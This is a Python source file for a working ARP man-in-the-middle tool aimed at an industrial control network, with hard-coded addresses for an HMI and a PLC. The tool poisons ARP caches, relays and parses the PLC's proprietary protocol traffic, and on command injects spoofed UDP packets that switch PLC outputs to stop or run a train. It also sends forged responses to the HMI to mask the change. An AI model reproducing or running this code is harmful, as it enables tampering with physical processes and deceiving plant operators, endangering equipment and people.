# -*- coding: utf-8 -*-
import scapy.all as scapy
from random import randint
import threading, os, sys, optparse
import atexit
import time
from construct import *
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send
from scapy.layers.inet import UDP, IP
#from struct import Struct


options = optparse.OptionParser(usage='%prog -t <Target IP> -g <Gateway IP> -i <Interface>',
                                description='ARP MiTM Tool')
options.add_option('-t', '--target', type='string', dest='target', help='The Target IP')
options.add_option('-g', '--gateway', type='string', dest='gateway', help='The Gateway')
options.add_option('-i', '--interface', type='string', dest='interface', help='Interface to use')
# Filters
options.add_option('--tcp', action='store_true', dest='tcp', help='Filters out only tcp traffic')
options.add_option('--udp', action='store_true', dest='udp', help='Filters out only udp traffic')
options.add_option('-d', '--destination_port', type='string', dest='d_port', help='Filter for a destination port')
options.add_option('-s', '--source_port', type='string', dest='s_port', help='Filter for a source port')
# Options
options.add_option('--sniff', action="store_true", dest="sniff_pkts", help='Sniff all passing data')
options.add_option('--sniff-dns', action="store_true", dest="dns_sniff", help='Sniff only searched domains')
options.add_option('--sniff-dns-gource', action="store_true", dest="dns_sniff_gource",
                   help='Output target\'s DNS searches in gource format')

options.add_option('-v', action='store_true', dest='verbose', help='Verbose scapy packet print')
opts, args = options.parse_args()
hmi_sequence = ""
version = '3.15'
target = opts.target
gateway = opts.gateway
interface = opts.interface
dns_sniff = opts.dns_sniff
dns_sniff_gource = opts.dns_sniff_gource
sniff_pkts = opts.sniff_pkts

inputhead = []
vthread = []
gwthread = []
layers = []
scapy_filter = {"protocol": None, "dst_port": None, "src_port": None}
random_filename = "/tmp/" + str(randint(10000, 99999))

# ---------------------------------------
#LocalIP = "192.168.3.123"
LocalIP = "192.168.3.103"
#LocalMac = "00:0c:29:d9:f6:46"
#LocalMac = "00:0c:29:94:aa:bf"
#LocalMac = "00:0c:29:95:47:2a" 
#LocalMac  = "00:0c:29:eb:98:9a"
LocalMac = "00:e0:4c:68:f9:4b"

HMI_IP = "192.168.3.18"
#HMI_MAC = "58:52:8a:b9:ea:34"
#HMI_MAC = "58:52:8a:b9:e0:0e"
HMI_MAC = "28:e9:8e:24:bb:e0"
PLC_IP = "192.168.3.39"  # TargetM_IP
#PLC_MAC = "28:e9:8e:1b:ce:c7"
PLC_MAC = "30:be:3b:8a:1a:f9"
# ---------------------------------------


flag =0
pak = "57000000001111070000ffff0300000000000022001c000a08000000000000000014022d0000000001000090000a000000000000000001"
fake_packet_send = "d7 00 60 00 00 11 11 07 00 00 00 e4 03 00 ff ff 03 00 00 18 00 9c 00 0c 08 00 00 00 00 01 00 00 00 00 00 04 02 47 00 00 00 00 00 00 04"
LED_OFF_PACKET_ATTACK = "57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 1b 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 00 00"
attack_packet_ledon="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00"      #?
attack_packet_ledoff="57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 00 00"     #? 

MITZ_LINK = Struct(
    'type' / Int16ul,
    'seq1' / Int16ul,
    'idk1' / Bytes(0xf),
    'length' / Int16ul,
    'idk2' / IfThenElse(this.type == 0x57, Bytes(0xe), Bytes(0x10)),
    'seq2' / Int8ul,
    'pad' / IfThenElse(this.type == 0x57, Bytes(this.length - 0xe - 1), Bytes(this.length - 0x10 - 1))
)

class bcolours:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'  
    FAIL = '\033[91m'
    ENDC = '\033[0m'

class user:
    CURRENT_USER_NAME = os.getlogin()
    CURRENT_USER_ID = os.getuid()

def unprivileged_user_print(username):
    print("\n" + bcolours.FAIL + "You are running this as " + bcolours.WARNING + user.CURRENT_USER_NAME + bcolours.FAIL + " which is not" + bcolours.WARNING + " root." + bcolours.FAIL)
    print("Consider running it as root." + bcolours.ENDC)

def setup_ipv_forwarding():
    if not dns_sniff_gource:
        print(bcolours.OKBLUE + '[Info] Enabling IP Forwarding...' + bcolours.ENDC)
    #os.system('sysctl -w net.inet.ip.forwarding=0 > /dev/null')  
    #os.system('sudo sysctl -w net.inet.ip.forwarding=0 > /dev/null ')
    os.system('sudo sysctl net.ipv4.ip_forward=1 > /dev/null') 
def exit_handler():
    if not dns_sniff_gource:
        print(bcolours.OKBLUE + '[Info] Disabling IP Forwarding...' + bcolours.ENDC)
    #os.system('sysctl -w net.inet.ip.forwarding=0 > /dev/null')
    #os.system('sudo sysctl -w net.inet.ip.forwarding=0 > /dev/null ')
    os.system('sudo sysctl net.ipv4.ip_forward=0 > /dev/null') 
    print(bcolours.OKBLUE + '[Info] Application Ended Gracefully.' + bcolours.ENDC)


atexit.register(exit_handler)


def filter_parser():
    if opts.tcp and opts.udp:
        scapy_filter["protocol"] = ''
    if not (opts.tcp or opts.udp):
        scapy_filter["protocol"] = ''
    elif opts.tcp or opts.udp:
        scapy_filter["protocol"] = 'tcp and ' if opts.tcp else 'udp and '
    if opts.d_port: scapy_filter["dst_port"] = opts.d_port
    if opts.s_port: scapy_filter["src_port"] = opts.s_port

    final_filter = scapy_filter["protocol"] + '((src host ' + target + ' or dst host ' + target + ')'
    if scapy_filter["dst_port"]:
        final_filter += ' and dst port ' + scapy_filter["dst_port"] + ')'
    elif dns_sniff or dns_sniff_gource:
        final_filter += ' and dst port 53)'
    else:
        final_filter += ')'
    if scapy_filter["src_port"]:
        final_filter += ' and (src port ' + scapy_filter["src_port"] + ')'
    return final_filter


def dnshandle(pkt):
    if dns_sniff_gource:
        sys.stdout = open(random_filename + 'parsed_nmap', 'a')
        FQDN = pkt.getlayer(scapy.DNS).qd.qname
        domain = FQDN.split('.')
        print(str(time.time())[:-3] + "|" + target + "|A|" + str(domain[1]) + '/' + str(FQDN))
    else:
        if pkt.haslayer(scapy.DNS):
            print(bcolours.OKBLUE + pkt.getlayer(scapy.IP).src + '\t' + pkt.getlayer(scapy.IP).dst + '\t' + bcolours.WARNING + pkt.getlayer(scapy.DNS).qd.qname + bcolours.ENDC)


def forward(pkt):
    fd = 0
    if pkt.haslayer(IP):
        ether = pkt.getlayer(Ether)

        #�쒖뭅�� 留μ＜�� �� �뺤씤�섏꽭��
        #
        #
        if str(ether.dst) == LocalMac and str(pkt[IP].dst) != LocalIP:
            if ether.src == HMI_MAC:
                #print("receive => "+str(ether.src))
                ether.dst = PLC_MAC
                #print("send PLC => " +str(ether.dst))
                ether.src = LocalMac
                fd = 1
            elif ether.src == PLC_MAC:
                ether.dst = HMI_MAC
                ether.src = LocalMac
                fd = 1

        if fd == 1:
            try:
                sendp(pkt, iface=interface)
                pkt.haslayer(UDP)
            except:
                pass


def rawhandle(pkt):
    if sniff_pkts:
        scapy.wrpcap(random_filename + "arpy.pcap", pkt)
        counter = 0
        while counter < 1:
            counter += 1
            layer = pkt.getlayer(counter)
            if layer.haslayer(scapy.Raw) and layer.haslayer(scapy.IP):
                tcpdata = layer.getlayer(scapy.Raw).load
                global flag
                if not opts.verbose:
                    hex_tcpdata = tcpdata.hex()
                    splitpacket = hex_tcpdata[0:2]
                    print(hex_tcpdata)
                    print("print hex value")

                    if splitpacket == "d7" or splitpacket == "57":
                        parsed_packed = MITZ_LINK.parse(tcpdata)
                        if parsed_packed.type == 0xd7:
                            bytes = parsed_packed.pad
                            hex_pad_byte = bytes.hex()
                            bytes = parsed_packed.idk1
                            hex_idk1_byte = bytes.hex()
                            bytes = parsed_packed.idk2
                            hex_idk2_byte = bytes.hex()
                        
                    if flag == "0" or flag == 0:
                        forward(pkt)
                    elif flag == "1":
                        Send_LED_ON()
                        print("PLC ON")
                        flag =0
                    elif flag == "2":
                        Send_LED_OFF()
                        print("PLC OFF")
                        flag =5
                    elif flag == "3":
                        print("BYE")
                        exit()
                    elif flag == 5:
                        Send_FAKE_RESPONSE()
                else:
                    print(layer.show())
            else:
                break


def poison():
    v = scapy.ARP(pdst=target, psrc=gateway)
    while True:
        try:
            scapy.send(v, verbose=0, inter=1, loop=1)
        except KeyboardInterrupt:
            print(bcolours.OKBLUE + '  [Warning] Stopping...' + bcolours.ENDC)
            sys.exit(3)

def gw_poison():
    gw = scapy.ARP(pdst=gateway, psrc=target)
    while True:
        try:
            scapy.send(gw, verbose=0, inter=1, loop=1)
        except KeyboardInterrupt:
            print(bcolours.OKBLUE + '  [Warning] Stopping...' + bcolours.ENDC)
            sys.exit(3)

def run():
    global flag
    while(True):
        print("thread run")
        flag = input()
        if flag == "3":
            print("BYE")
            exit()

def Send_LED_ON():
    #data_on = bytes.fromhex("57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00")
    data_on = bytes.fromhex(attack_packet_ledon)
    udpf = IP(src="192.168.3.18", dst="192.168.3.39") / UDP(sport=5001, dport=5006) / (data_on)
    send(udpf)
    print("LED ON \n")
    time.sleep(0.01)

def Send_LED_OFF():
    #data_on = bytes.fromhex("57 00 00 00 00 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 00 01")
    data_on = bytes.fromhex(attack_packet_ledoff)
    udpf = IP(src="192.168.3.18", dst="192.168.3.39") / UDP(sport=5001, dport=5006) / (data_on)
    send(udpf)
    time.sleep(0.01)

def Send_FAKE_RESPONSE():
    data_on = bytes.fromhex(fake_packet_send)
    udpf = IP(src="192.168.3.39", dst="192.168.3.18") / UDP(sport=5006, dport=5001) / (data_on)
    send(udpf)

def start_poisen(target, interface, scapy_filter):
    inputh = threading.Thread(target=run)
    inputh.setDaemon(True)
    inputhead.append(inputh)
    inputh.start()
    vpoison = threading.Thread(target=poison)
    vpoison.setDaemon(True)
    vthread.append(vpoison)
    vpoison.start()
    gwpoison = threading.Thread(target=gw_poison)
    gwpoison.setDaemon(True)
    gwthread.append(gwpoison)
    gwpoison.start()
    if dns_sniff or dns_sniff_gource:
        pkt = scapy.sniff(iface=interface, filter=scapy_filter, prn=dnshandle)
    else:
        scapy.sniff(iface=interface, filter=scapy_filter, prn=rawhandle)


def main():
    try:
        if user.CURRENT_USER_ID != 0:
            unprivileged_user_print(user.CURRENT_USER_NAME)
        if dns_sniff_gource:
            print(bcolours.OKBLUE + '[INFO] For a live gource feed run this command in parallel with this one:' + bcolours.WARNING + '\n\ntail -f ' + random_filename + 'parsed_nmap | tee /dev/stderr | gource -log-format custom -a 1 --file-idle-time 0 -\n\n' + bcolours.ENDC)


        if (not dns_sniff_gource) or (dns_sniff or sniff_pkts):
            if target == None or gateway == None and interface == None:
                options.print_help()
                return
            if dns_sniff:
                print(bcolours.OKBLUE + '\n  [Info] Starting DNS Sniffer...\n' + bcolours.ENDC)
            elif sniff_pkts:
                print(bcolours.OKBLUE + '\n  [Info] Starting Sniffer...\n' + bcolours.ENDC)
        if dns_sniff_gource or dns_sniff or sniff_pkts:
            setup_ipv_forwarding()
            print(bcolours.OKBLUE + '[Info] Filter: ' + filter_parser() + bcolours.ENDC)
            print("Target\tDNS\tFQDN")
            print("-------------------------------------------")
            print("Command Input")
            print("0 : Stop MITM Attack")
            print("1 : MITM Attack - Train Stop")
            print("2 : MITM Attack - Train run")
            print("3 : Process Terminate")
            print("-------------------------------------------")
            #while True:
            start_poisen(target, interface, filter_parser())
         
        else:
            options.print_help()
    except KeyboardInterrupt:
        print(bcolours.WARNING + '  [Warning] Stopping...' + bcolours.ENDC)
        sys.exit(3)

if __name__ == '__main__':
    main()
